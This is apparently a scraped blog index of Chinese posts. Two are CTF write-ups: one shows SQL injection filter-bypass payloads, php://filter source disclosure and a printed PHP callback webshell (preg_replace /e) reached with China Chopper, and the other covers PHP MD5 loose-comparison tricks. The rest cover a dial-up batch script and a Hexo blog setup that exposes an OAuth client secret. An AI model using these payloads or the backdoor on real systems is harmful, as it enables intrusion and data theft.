convert.quoted-printable-encode \u0026amp; convert.quoted-printable-decode Compression Filters Encryption Filters 注入 全局搜索 mysql_query ，发现 say.php,so.php,index.php 都存在数据库操作。选择 so.php 下手。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 /*so.php*/ \u0026lt;?php if($_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]!=\u0026#34;Xlcteam Browser\u0026#34;){ echo \u0026#39;万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~\u0026#39;; exit(); } $id=$_POST[\u0026#39;soid\u0026#39;]; include \u0026#39;config.php\u0026#39;; include \u0026#39;antiinject.php\u0026#39;; include \u0026#39;antixss.php\u0026#39;; $id=antiinject($id); $con = mysql_connect($db_address,$db_user,$db_pass) or die(\u0026#34;不能连接到数据库！！\u0026#34;.mysql_error()); mysql_select_db($db_name,$con); $id=mysql_real_escape_string($id); $result=mysql_query(\u0026#34;SELECT * FROM `message` WHERE display=1 AND id=$id\u0026#34;); $rs=mysql_fetch_array($result); echo htmlspecialchars($rs[\u0026#39;nice\u0026#39;]).\u0026#39;:\u0026lt;br /\u0026gt;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026amp;nbsp;\u0026#39;.antixss($rs[\u0026#39;say\u0026#39;]).\u0026#39;\u0026lt;br /\u0026gt;\u0026#39;; mysql_free_result($result); mysql_free_result($file); mysql_close($con); ?\u0026gt; --------------------------------------------------------------------------------------- /*antiinject.php*/ \u0026lt;?php function antiinject($content){ $keyword=array(\u0026#34;select\u0026#34;,\u0026#34;union\u0026#34;,\u0026#34;and\u0026#34;,\u0026#34;from\u0026#34;,\u0026#39; \u0026#39;,\u0026#34;\u0026#39;\u0026#34;,\u0026#34;;\u0026#34;,\u0026#39;\u0026#34;\u0026#39;,\u0026#34;char\u0026#34;,\u0026#34;or\u0026#34;,\u0026#34;count\u0026#34;,\u0026#34;master\u0026#34;,\u0026#34;name\u0026#34;,\u0026#34;pass\u0026#34;,\u0026#34;admin\u0026#34;,\u0026#34;+\u0026#34;,\u0026#34;-\u0026#34;,\u0026#34;order\u0026#34;,\u0026#34;=\u0026#34;); $info=strtolower($content); for($i=0;$i\u0026lt;=count($keyword);$i++){ $info=str_replace($keyword[$i], \u0026#39;\u0026#39;,$info); } return $info; } ?\u0026gt; 关注 3、11、14、15行。\nburp抓包，修改 User-Agent 字段即可。\nantiinject() 过滤规则是按黑名单依次把关键字删除。\n用黑名单里最后一个关键字 = 分隔即可绕过对多字符关键字的过滤。 用 /**/ 代替空格符。 单字符关键字不太会弄，也许可以用各种编码绕过，不过我们暂时未必需要，有空格和这些多字符关键字，再加上不在黑名单里的 \u0026lt;\u0026gt;/() 已经可以开始搞事了。 mysql_real_escape_string() 的功能是对\\x00, \\n, \\r, \\, ', \u0026quot; , \\x1a(撤销键,ctrl+z) 加反斜杠转义，我们不用这些字符就是了。\n15行处将处理过的参数直接拼接到查询语句，因为查询结果有多列，又没有逗号可用，不好用内联注入，于是尝试基于逻辑的注入。数据库结构在 sm.txt 已经给出。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 我们想要在数据库执行的查询语句是这样： SELECT * FROM `message` WHERE display=1 AND id=1 and ascii(mid((select userpass from admin)from 1 for 1))\u0026gt;65 因为没法用空格，所以实际上是这样： SELECT * FROM `message` WHERE display=1 AND id= 1/**/and/**/ascii(mid((select/**/userpass/**/from/**/admin)from/**/1/**/for/**/1))\u0026gt;65 希望经过过滤的 id 值为： 1/**/and/**/ascii(mid((select/**/userpass/**/from/**/admin)from/**/1/**/for/**/1))\u0026gt;65 向 so.php post过去的参数应该是： soid=1/**/an=d/**/ascii(mid((selec=t/**/userpas=s/**/fro=m/**/admi=n)fro=m/**/1/**/fo=r/**/1))\u0026gt;65 使用burp爆破 soid=1/**/an=d/**/ascii(mid((selec=t/**/userpas=s/**/fro=m/**/admi=n)fro=m/**/§1§/**/fo=r/**/1))\u0026gt;§65§ 使用 Cluster Bomb 模式，第一个payload 为 [1-40] ，第二个为 [31,32,47-57](经过几次尝试发现usepass字段只有[ \\d] ) 得到[49,48,50,32,49,49,55,32,57,57,32,49,48,55,32,49,49,52,32,48,49,55,32,49,49,48,32,49,49,54,32,49,49,55] 也就是[102 ,117 ,99 ,107 ,114 ,117 ,110 ,116 ,117]即funckruntu，访问loginxlcteam登陆即可 进后台得知有管理员留的后门 xlcteam.php ，于是读一下这个文件 意外 看别人的writeup时惊喜的发现原来并没有过滤逗号，这意味着可以一次注出来管理员密码！所以深夜里我是有些激动的。\n1 2 3 soid=1/**/an=d/**/0/**/unio=n/**/selec=t/**/null,usernam=e,userpas=s,null/**/fro=m/**/admi=n //当然，在充分掌握数据库结构前需要一些尝试。 使用回调后门 回调后门似乎是 phithon 师傅最先这样称呼的，在 创造tips的秘籍——PHP回调后门 里做了具体介绍。\n1 2 3 4 5 6 7 8 9 //xlcteam.php \u0026lt;?php $e = $_REQUEST[\u0026#39;www\u0026#39;]; $arr = array($_POST[\u0026#39;wtf\u0026#39;] =\u0026gt; \u0026#39;|.*|e\u0026#39;,); array_walk($arr, $e, \u0026#39;\u0026#39;); ?\u0026gt; //使用菜刀连接即可。 //url : http://cms.nuptzj.cn/xlcteam.php?www=preg_replace //密码:\twtf 菜刀连上后拿到所有文件，发现 config.php 里有数据库配置，于是就可以操作整个数据库了。\n是的，中午吃的是美味的黄焖鸡 \\o/\n","permalink":"https://ret2neo.cn/post/171004nuptzonghe2wp/","summary":"非xss题 但是欢迎留言~ 地址：get the flag\n读取源码 在页面底部发现一个这样的链接：http://cms.nuptzj.cn/about.php?file=sm.txt ，说明题目提供了读取文件功能，如果使用 file://协议 读取，HTML预留字符会以字符实体显示，看起来不方便，所以也可以编码读取后再本地解码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 http://cms.nuptzj.cn/about.php?file=php://filter/convert.base64-encode/resource=filename 在拿到的文件里搜索 \u0026#34;.php\u0026#34; ，顺藤摸瓜，能找到并读取到的文件有： sm.txt about.php index.php passencode.php say.php antixss.php so.php preview.php antiinject.php ----------------------------- 知道有 loginxlcteam目录或文件 和 config.php 但还读不到 ；还不知道有list.php ,xlcteam.php 关于file://协议 file://协议 (RFC8089 )是用来访问本地文件系统的，因为文件系统 是 PHP 使用的默认封装协议，因此在fopen()、 copy()、 file_exists() 、 file_get_contents()和 filesize() 等文件系统函数中是支持的。\n在谷歌/火狐浏览器的URL框里输入 file:///D:/ 或者在Linux命令行里敲 lynx file:/// 都可以看到效果。\nPHP文档 提供的用法如下：\n/path/to/file.ext relative/path/to/file.ext fileInCwd.ext C:/path/to/winfile.ext C:\\path\\to\\winfile.","title":"南邮CTF平台综合题2writeup"},{"content":"校园网使用PPPoE拨号上网，每次都通过图形化界面通断网络不太方便，希望能一键上网一键下线，于是写了个小脚本。\n配置好相关参数后保存为 C:\\Windows\\System32\\surf.bat ，重启命令行即可使用 surf 命令通断网络，常用的话甚至只要 win+r-\u0026gt;enter就可以自由迅速地上线下线啦。把下面第二十行的注释去掉可以在联网同时打开ss，有些缺憾的是还没有实现断网时退出ss。\n流程控制参考了Batch Guide by Terry Newton 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 REM 校园网使用PPPoE拨号上网，将文件内容存为 C:\\Windows\\System32\\surf.bat ，可以命令行拨号上网 REM 可自行加开ss @echo off set name=net REM 修改net 为拨号连接的名字 set phone=13323333333 REM\t修改为拨号上网手机号 set pass=2333 REM 运营商提供的密码 rasdial | findstr 已连接 \u0026gt; nul if errorlevel 1 goto notfound rem string was found rasdial %name% /disconnect goto endfind :notfound rem string was not found rasdial %name% %phone% %pass% if \u0026#34;%1\u0026#34; neq \u0026#34;\u0026#34; goto :endfind REM start C:\\path\\to\\your\\Shadowsocks\\Shadowsocks.exe :endfind 2017/10/05 更新代码 添加第十九行，如果ss已经在运行，只要传入一个参数就不会尝试开启啦。\n2018-03-12重写 逻辑更清晰，添加重连功能，有时被ban可以起到刷新IP的作用。\nsurf r 断开并重新连接 surf 通\u0026lt;=\u0026gt;断 surf any 连接但不启动shadow socks 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 @echo off set name=net REM 修改net 为拨号连接的名字 set phone=13323333333 REM\t修改为拨号上网手机号 set pass=2333 REM 运营商提供的密码\trasdial | findstr 已连接 \u0026gt; nul set is_connect=%errorlevel% echo %is_connect% if %is_connect%==1 goto not_connected if %is_connect%==0 goto connected :connected if \u0026#34;%1\u0026#34;==\u0026#34;r\u0026#34; goto re_connect goto disconnect :not_connected if \u0026#34;%1\u0026#34;==\u0026#34;s\u0026#34; goto connect_with_ss goto connect_without_ss rem ========================================== :re_connect rasdial %name% /disconnect ping 127.1 -n 2 \u0026gt; nul rasdial %name% %phone% %pass% ipconfig | find \u0026#34;IPv4\u0026#34; goto end :disconnect rasdial %name% /disconnect goto end :connect_without_ss rasdial %name% %phone% %pass% ipconfig | find \u0026#34;IPv4\u0026#34; goto end :connect_with_ss rasdial %name% %phone% %pass% start D:\\path\\to\\Shadowsocks-4.0.6\\Shadowsocks.exe ipconfig | find \u0026#34;IPv4\u0026#34; goto end :end 2018/4/12 22:44 update 由于断开与重新拨号间需要有个时延，所以以上代码使用第26行实现，这也是大部分batch脚本实现时延的方法。\nping 127.1 n_seconds \u0026gt; nul 可以实现整秒延时，而TK教主在 完美的批处理Sleep 中提到一种在批处理脚本中理论上能精确到0.01秒的延时操作。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 @ECHO OFF SETLOCAL EnableExtensions CALL :ProcDelay 50 GOTO :EOF REM 可以理解为函数名和参数 :ProcDelay delayMSec_ REM SETLOCAL和 ENDLOCAL 之间是拥有独立的环境变量空间 SETLOCAL EnableExtensions REM EnableExtensions 在本空间内使能命令扩展 REM 参考 https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc772046(v%3dws.11) REM %TIME% 形如 23:12:22.42 包括时分秒和毫秒 FOR /f \u0026#34;tokens=1-4 delims=:. \u0026#34; %%h IN (\u0026#34;%TIME%\u0026#34;) DO SET start_=%%h%%i%%j%%k REM 循环 :_procwaitloop FOR /f \u0026#34;tokens=1-4 delims=:. \u0026#34; %%h IN (\u0026#34;%TIME%\u0026#34;) DO SET now_=%%h%%i%%j%%k SET /a diff_=%now_%-%start_% REM 1% 即 delayMSec_ 即 50 IF %diff_% LSS %1 GOTO _procwaitloop ECHO \u0026#34;%start_% =\u0026gt; %now_%\u0026#34; ENDLOCAL \u0026amp; GOTO :EOF :EOF 原文如下：\n","permalink":"https://ret2neo.cn/post/171003cmdsurfnet/","summary":"校园网使用PPPoE拨号上网，每次都通过图形化界面通断网络不太方便，希望能一键上网一键下线，于是写了个小脚本。\n配置好相关参数后保存为 C:\\Windows\\System32\\surf.bat ，重启命令行即可使用 surf 命令通断网络，常用的话甚至只要 win+r-\u0026gt;enter就可以自由迅速地上线下线啦。把下面第二十行的注释去掉可以在联网同时打开ss，有些缺憾的是还没有实现断网时退出ss。\n流程控制参考了Batch Guide by Terry Newton 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 REM 校园网使用PPPoE拨号上网，将文件内容存为 C:\\Windows\\System32\\surf.bat ，可以命令行拨号上网 REM 可自行加开ss @echo off set name=net REM 修改net 为拨号连接的名字 set phone=13323333333 REM\t修改为拨号上网手机号 set pass=2333 REM 运营商提供的密码 rasdial | findstr 已连接 \u0026gt; nul if errorlevel 1 goto notfound rem string was found rasdial %name% /disconnect goto endfind :notfound rem string was not found rasdial %name% %phone% %pass% if \u0026#34;%1\u0026#34; neq \u0026#34;\u0026#34; goto :endfind REM start C:\\path\\to\\your\\Shadowsocks\\Shadowsocks.","title":"命令行拨号上网"},{"content":"利用GitHub page和hexo搭建一个个人博客主要分三步：\n使用hexo在本地搭建一个可访问的博客。 自定义博客样式。 将博客发布到GitHub page。 hexo本地搭建可访问博客 官方文档讲的很详细了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 #基于Windows 10 ; hexo: 3.3.9 ; next Release 5.0.0 #1.安装 Node.js (https://nodejs.org/en/download/) #2.安装 Git for Windows (https://github.com/waylau/git-for-win) #3.安装 hexo # 打开cmd.exe npm install -g hexo-cli #4. 创建博客 # 进入想要放博客文件的目录 hexo init \u0026lt;folder\u0026gt; cd \u0026lt;folder\u0026gt; npm install # 到此为止已经可以看到效果 # hexo clean;hexo g;hexo s [--debug] #5. 自选主题，如next (http://theme-next.iissnan.com/getting-started.html) cd themes git clone https://github.com/iissnan/hexo-theme-next themes/next # 到此为止目录结构如下 . ├── _config.yml [站点配置文件] ├── ... ├── source | ├── _drafts | └── _posts └── themes ├──landscape └──next └──_config.yml [博客配置文件] 自定义博客样式 blog/_config.yml git commit\nblog/themes/next/_config.yml git commit\n版权声明 ，参考 blog\\themes\\next\\layout_macro\\post-copyright.swig 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;ul class=\u0026#34;post-copyright\u0026#34;\u0026gt; \u0026lt;li class=\u0026#34;post-copyright-title\u0026#34;\u0026gt; \u0026lt;strong\u0026gt;{{ __(\u0026#39;post.copyright.title\u0026#39;) + __(\u0026#39;symbol.colon\u0026#39;) }}\u0026lt;/strong\u0026gt; \u0026lt;a href=\u0026#34;{{ post.permalink }}\u0026#34; \u0026gt;{{ post.title }}\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;post-copyright-author\u0026#34;\u0026gt; \u0026lt;strong\u0026gt;{{ __(\u0026#39;post.copyright.author\u0026#39;) + __(\u0026#39;symbol.colon\u0026#39;) }}\u0026lt;/strong\u0026gt; \u0026lt;a href=\u0026#34;{{config.url}}\u0026#34; title=\u0026#34;{{__(\u0026#39;post.copyright.welcome\u0026#39;)}}\u0026#34;\u0026gt; {{ config.author }}\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;post-copyright-link\u0026#34;\u0026gt; \u0026lt;strong\u0026gt;{{ __(\u0026#39;post.copyright.link\u0026#39;) + __(\u0026#39;symbol.colon\u0026#39;) }}\u0026lt;/strong\u0026gt; \u0026lt;a href=\u0026#34;{{ post.permalink }}\u0026#34; title=\u0026#34;{{ post.title }}\u0026#34;\u0026gt;{{ post.permalink }}\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;li class=\u0026#34;post-copyright-license\u0026#34;\u0026gt; \u0026lt;strong\u0026gt;{{ __(\u0026#39;post.copyright.license_title\u0026#39;) + __(\u0026#39;symbol.colon\u0026#39;) }} \u0026lt;/strong\u0026gt; {{ __(\u0026#39;post.copyright.license_content\u0026#39;, theme.post_copyright.license_url, theme.post_copyright.license) }} \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; blog\\themes\\next\\languages\\zh-Hans.yml 1 2 3 4 5 6 7 8 9 10 ##部分 post: copyright: title: 本文标题 author: 文章作者 link: 原始链接 license_title: 版权声明 welcome: \u0026#39;访问 findneo 的个人博客\u0026#39; license_content: 本文在\u0026lt;i class=\u0026#34;fa fa-creative-commons\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;a href=\u0026#34;%s\u0026#34; rel=\u0026#34;external nofollow\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;%s\u0026lt;/a\u0026gt;下发布。转载请保留原始链接。 文章模板 blog\\scaffolds\\post.md 1 2 3 4 5 6 7 8 --- title: {{ title }} date: {{ date }} categories: tags: [] ###可以直接用tags: [tag1,tag2]代替多行tags description: ###当主题配置文件中的excerpt_description开启时，会把这一部分作为文章摘要 --- 将博客发布到GitHub page 网站内容发布 官方文档\n1 2 3 创建GitHub账户，新建username.github.io项目，为git配置ssh npm install hexo-deployer-git --save hexo d 开发内容与配置文件备份 由于主题next本身是git项目，所以直接在blog文件夹内git init，然后整个blog文件夹(当然blog/.gitignore已经排除了没用的子文件夹)push到GitHub会发现next文件夹整个是空的。因此要做git库的嵌套处理，但比较麻烦，而且似乎不适用于这种情况。所以最后我采用在第一次push前把blog\\themes\\next\\.git 重命名为 blog\\themes\\next\\now-donot-use.git ，于是blog无法识别到next这个项目，成功地备份了所有配置。将来如果要更新主题，只需重命名回来，然后 git pull ，更新完改回去即可。\n本地调试完成后，只需在git bash里执行./ok [\u0026quot;you commit comment\u0026quot;] 即可完成部署和配置备份，ok文件内容如下：\n1 2 3 4 5 6 7 8 9 10 hexo clean hexo d git add -A if [ \u0026#34;$1\u0026#34; = \u0026#34;\u0026#34; ] then git commit -m \u0026#34;Update.\u0026#34; else git commit -m \u0026#34;$1\u0026#34; fi git push emmm,重装系统了 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 从头开始，安装git fro windows，配置ssh git config --global user.name your_name git config --global user.email your_mail ssh-keygen -t rsa -b 4096 -C \u0026#34;your_email@example.com\u0026#34; clip \u0026lt; ~/.ssh/id_rsa.pub ssh -T git@github.com 验证ssh可用 ------------------------------------- 在GitHub新建findneo.github.io git clone https://github.com/findneo/findneo.github.io.git cd findneo.github.io git checkout -b bakeup 新建备份分支并设为默认分支，因为后面只手动操作这个分支，master分支由hexo-deployer-git自动操作 hexo init tmp cp -a tmp/* ./ rm -rf tmp npm install --save hexo-deployer-git npm install --save hexo-generator-baidu-sitemap npm install --save hexo-generator-sitemap npm install --save hexo-generator-searchdb npm install --save hexo-generator-feed npm install --save hexo-wordcount npm install --save lozad -------------------------------------\t在站点配置文件中配置git-deployer为master分支 git add . git commit -m \u0026#34;...\u0026#34; git push origin bakeup hexo d -g 参考了这位朋友的备份方法，很棒，(๑•̀ㅂ•́)و✧。\n列个软件清单：\nWSL、everything、 Typora 、shadow socks、chrome、firefox、notepad++ 、一键上网脚本、 sublime、印象笔记、python2/3、git for windows、vmware/kali/win7、AgentRansack、7z、射手影音、SumatraPDF、微软办公系列 WPS Office 2013 个人版 、IObitUninstaller、snipaste\nburpsuite、fiddler、wireshark、nmap、sqlmap、winhex、ziperello、weevely、winhex、御剑、awvs\n添加gitment作为评论系统 项目介绍:https://imsun.net/posts/gitment-introduction/\n在 findneo.github.io\\themes\\next\\layout_partials\\comments.swig 的倒数第二个endif前添加\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 {% elseif config.gitment.owner and config.gitment.commentrepo and config.gitment.clientid and config.gitment.clientsecret %} \u0026lt;div id=\u0026#34;gitmentContainer\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://imsun.github.io/gitment/style/default.css\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://imsun.github.io/gitment/dist/gitment.browser.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var gitment = new Gitment({ id: \u0026#39;{{page.title}}\u0026#39;, owner: \u0026#39;{{config.gitment.owner}}\u0026#39;, repo: \u0026#39;{{config.gitment.commentrepo}}\u0026#39;, oauth: { client_id: \u0026#39;{{config.gitment.clientid}}\u0026#39;, client_secret: \u0026#39;{{config.gitment.clientsecret}}\u0026#39;, }, }) gitment.render(\u0026#39;gitmentContainer\u0026#39;) \u0026lt;/script\u0026gt; 然后在站点配置文件末尾添加\n1 2 3 4 5 gitment: owner: findneo commentrepo: findneo.github.io clientid: a3407310dfbeafbfe55a clientsecret: ad6c900a0fce4a44b8eeb40e1790ee7c7cc7575d 需要注意的是每发布一篇文章都需要把该页面初始化一下其他人才可以评论，这是因为评论基于issue，并不是bug\n单独控制每篇文章版权声明 给 themes\\next\\layout\\_macro\\post-copyright.swig 加上控制流程，通过每个post的 front-matter控制，遇到想不加版权声明的文章就在头部加上 notoriginal: true 即可，不影响已有文章。\n1 2 3 {% if not post.notoriginal %} foo {% endif %} 20180510 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 https://hexo.io/ https://www.haomwei.com/technology/maupassant-hexo.html http://leonshi.com/2016/02/01/add-existing-project-to-github/ cd d: hexo init myblog cd myblog rm themes/landscape/ -rf git clone https://github.com/tufu9441/maupassant-hexo.git themes/maupassant npm install hexo-renderer-pug --save npm install hexo-renderer-sass --save mv themes\\maupassant\\.git themes\\maupassant\\.git.noneed git init edit _config.yml npm install --save hexo-deployer-git npm install --save hexo-generator-baidu-sitemap npm install --save hexo-generator-sitemap npm install --save hexo-generator-searchdb npm install --save hexo-generator-feed git remote add origin https://github.com/superRaytin/alipay-app-ui.git git remote -v git push origin master 20181022 折叠代码块\n参考链接：https://www.bbsmax.com/A/gAJG9Qv8dZ/\n20200930 清空提交的历史记录\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 1.Checkout git checkout --orphan latest_branch 2. Add all the files git add -A 3. Commit the changes git commit -am \u0026#34;commit message\u0026#34; 4. Delete the branch git branch -D master 5.Rename the current branch to master git branch -m master 6.Finally, force update your repository 一键更新博客\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // sh update.sh hexo clean hexo d -g hexo clean git add -A if [ \u0026#34;$1\u0026#34; = \u0026#34;\u0026#34; ] then git commit -m \u0026#34;Update.\u0026#34; else git commit -m \u0026#34;$1\u0026#34; fi git push origin bakeup 使用git remote show origin 若发现是HTTP的可以通过 git remote remove origin git remote add origin git@github.com:findneo/findneo.github.io.git 改为SSH的，SSH的不会反复要求输密码 .gitignore\n1 2 3 4 5 6 .deploy_git/ node_modules/ themes/ public/ db.json .DS_Store 20210310 定制主页 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 1. 使用 https://github.com/theme-next/hexo-theme-next的Gemini主题 2. cp themes\\next\\layout\\archive.swig themes\\next\\layout\\index.swig 3. 修改主页title 将新index.swig中的 {% block title %}{{ __(\u0026#39;title.archive\u0026#39;) }} | {{ title }}{% endblock %} 修改为原始index.swig中的 {% block title %}{{ title }}{%- if theme.index_with_subtitle and subtitle %} - {{ subtitle }}{%- endif %}{% endblock %} 4. 删除鼓励语 注释新index.swig中的\u0026lt;div class=\u0026#34;collection-title\u0026#34;\u0026gt;...\u0026lt;/div\u0026gt; 5. 删除主页年份，修改博客日期格式 在 themes\\next\\layout\\_macro\\post-collapse.swig中删除\u0026lt;div class=\u0026#34;collection-year\u0026#34;\u0026gt;相关，修改\u0026lt;div class=\u0026#34;post-meta\u0026#34;\u0026gt;相关 6. 使主页更紧凑 在 themes\\next\\source\\css\\_common\\components\\post\\post-collapse.styl 将post_header的样式的border-bottom和margin都改为0 .post-header { border-bottom: 0px dashed $grey-light; margin: 0px 0; 20210310 解决TOC跳转失败 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 TOC无法正常跳转，一个以前没遇到过的bug，可能是中文目录引起的 现象： 点击TOC上的目录时console报错 Uncaught TypeError: Cannot read property \u0026#39;getBoundingClientRect\u0026#39; of null at HTMLAnchorElement.\u0026lt;anonymous\u0026gt; (utils.js:241) (anonymous) @ utils.js:241 解决办法 https://github.com/theme-next/hexo-theme-next/issues/1543#issuecomment-668549582 修改 themes\\next\\source\\js\\utils.js 中的registerSidebarTOC函数部分代码 const sections = [...navItems].map(element =\u0026gt; { var link = element.querySelector(\u0026#39;a.nav-link\u0026#39;); // TOC item animation navigate. link.addEventListener(\u0026#39;click\u0026#39;, event =\u0026gt; { event.preventDefault(); // var target = document.getElementById(event.currentTarget.getAttribute(\u0026#39;href\u0026#39;).replace(\u0026#39;#\u0026#39;, \u0026#39;\u0026#39;)); /*here*/var target = document.getElementById(decodeURI(event.currentTarget.getAttribute(\u0026#39;href\u0026#39;).replace(\u0026#39;#\u0026#39;, \u0026#39;\u0026#39;))); // to fix toc bug var offset = target.getBoundingClientRect().top + window.scrollY; window.anime({ targets : document.scrollingElement, duration : 500, easing : \u0026#39;linear\u0026#39;, scrollTop: offset + 10 }); }); // return document.getElementById(link.getAttribute(\u0026#39;href\u0026#39;).replace(\u0026#39;#\u0026#39;, \u0026#39;\u0026#39;)); /*here*/return document.getElementById(decodeURI(link.getAttribute(\u0026#39;href\u0026#39;).replace(\u0026#39;#\u0026#39;, \u0026#39;\u0026#39;))); // to fix toc bug }); 20210312 代码块溢出 1 2 3 用nvm（https://github.com/coreybutler/nvm-windows）安装了低版本的node还是没能解决。 大约是next的bug，把 next 从 https://github.com/theme-next/hexo-theme-next （最后更新在半年前）换成 https://github.com/next-theme/hexo-theme-next （十几天前还在更新）就好了。 next最早的版本是这个：https://github.com/iissnan/hexo-theme-next （三年前就不维护了），不禁感慨，开源不易，弃坑常有啊。 20210914去除RSS订阅 1 npm uninstall hexo-generator-feed --save ","permalink":"https://ret2neo.cn/post/170926hexoconfig/","summary":"利用GitHub page和hexo搭建一个个人博客主要分三步：\n使用hexo在本地搭建一个可访问的博客。 自定义博客样式。 将博客发布到GitHub page。 hexo本地搭建可访问博客 官方文档讲的很详细了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 #基于Windows 10 ; hexo: 3.3.9 ; next Release 5.0.0 #1.安装 Node.js (https://nodejs.org/en/download/) #2.安装 Git for Windows (https://github.com/waylau/git-for-win) #3.安装 hexo # 打开cmd.exe npm install -g hexo-cli #4. 创建博客 # 进入想要放博客文件的目录 hexo init \u0026lt;folder\u0026gt; cd \u0026lt;folder\u0026gt; npm install # 到此为止已经可以看到效果 # hexo clean;hexo g;hexo s [--debug] #5.","title":"博客搭建与自定义"},{"content":" 南邮CTF平台网址：\nhttp://ctf.nuptsast.com/challenges http://ctf.nuptzj.cn/challenges WEB 签到题 nctf{flag_admiaanaaaaaaaaaaa}\nctrl+u或右键查看源代码即可。在CTF比赛中，代码注释、页面隐藏元素、超链接指向的其他页面、HTTP响应头部都可能隐藏flag或提示信息。在渗透测试中，开发者留下的多余注释和测试页面有时也能提供线索。\nmd5 collision nctf{md5_collision_is_easy}\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php $md51 = md5(\u0026#39;QNKCDZO\u0026#39;); $a = @$_GET[\u0026#39;a\u0026#39;]; $md52 = @md5($a); if(isset($a)){ if ($a != \u0026#39;QNKCDZO\u0026#39; \u0026amp;\u0026amp; $md51 == $md52) { echo \u0026#34;nctf{*****************}\u0026#34;; } else { echo \u0026#34;false!!!\u0026#34;; }} else{echo \u0026#34;please input a\u0026#34;;} ?\u0026gt; 利用PHP弱类型，前人发现md5(\u0026lsquo;QNKCDZO\u0026rsquo;)=\u0026lsquo;0e830400451993494058024219903391\u0026rsquo;，md5(\u0026lsquo;240610708\u0026rsquo;)=\u0026lsquo;0e462097431906509019562988736854\u0026rsquo;，而因为使用松散比较的缘故，*var_dump(\u0026lsquo;0e830400451993494058024219903391\u0026rsquo;==\u0026lsquo;0e462097431906509019562988736854\u0026rsquo;);*值为真，因此访问 http://chinalover.sinaapp.com/web19/?a=240610708 即可。\n1、在PHP中，@被称为错误控制操作符(error control operator)，前置@符号的表达式产生的任何错误都将被忽略。\n2、1992年发布的MD5算法是一种广泛使用的哈希算法，最初被设计用来作为加密算法，在被证明不安全后只能用来做数据完整性校验。MD5算法为消息产生128位摘要，常表示为32位十六进制串，由[0-9a-e]组成。\n3、PHP的比较操作符主要有两类——松散比较和严格比较，于是就有了equal(==)和Identical(===)两种相等，主要区别在于前者会在比较前根据上下文对操作数进行类型转换(type juggling)而后者不会。这种juggle总的来说利大于弊，但确实容易玩脱。\n​\t此处只谈涉及字符串和数值的松散比较。根据本地实验结合官方文档，我们可以总结出来，这种类型转换的行为关键在于两点，一是判断字符串是否处于数字语境(in a numeric context)，二是如何为处于数字语境的字符串取值。\n​\t当操作符为==时，若有一个操作数为int/float或两个操作数is_numeric()均为真，则判断为处于数字语境；当操作符为数字操作符，如+-/*时，则判断为处于数字语境。（此段为实验支持下的个人猜测，未找到依据。）\n​\t根据PHP官方文档 ，如果一个字符串被认定处于数字语境，那么它的取值取决于字符串的前面一部分，如果字符串以有效的数字型数据【Valid numeric data ，正则匹配表达为 \\s(\\d+\\.?\\d*|\\.\\d+)([eE]\\d+)?\\s，含有[eE]的视为科学计数法】开头，那么字符串取开头部分的数值，否则取0 。实验发现1e也被取值为1而不是0，这有点奇怪 :(\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php $a1=1; $b1=\u0026#34;1\u0026#34;; $c1=\u0026#34;1padding\u0026#34;; $a2=.1; $b2=\u0026#34;.1\u0026#34;; $c2=\u0026#34;.1padding\u0026#34;; $a3=1.; $b3=\u0026#34;1.\u0026#34;; $c3=\u0026#34;1.padding\u0026#34;; $a4=1.1; $b4=\u0026#34;1.1\u0026#34;; $c4=\u0026#34;1.1padding\u0026#34;; $a5=1.e1; $b5=\u0026#34;1.e1\u0026#34;; $c5=\u0026#34;1.e1padding\u0026#34;; $a6=.1e1; $b6=\u0026#34;.1e1\u0026#34;; $c6=\u0026#34;.1e1padding\u0026#34;; $a7=1.1e1; $b7=\u0026#34;1.1e1\u0026#34;; $c7=\u0026#34;1.1e1padding\u0026#34;; $a8=1e1; $b8=\u0026#34;1e1\u0026#34;; $c8=\u0026#34;1e1padding\u0026#34;; var_dump($a8==$b8);//true var_dump($a8==$c8);//true 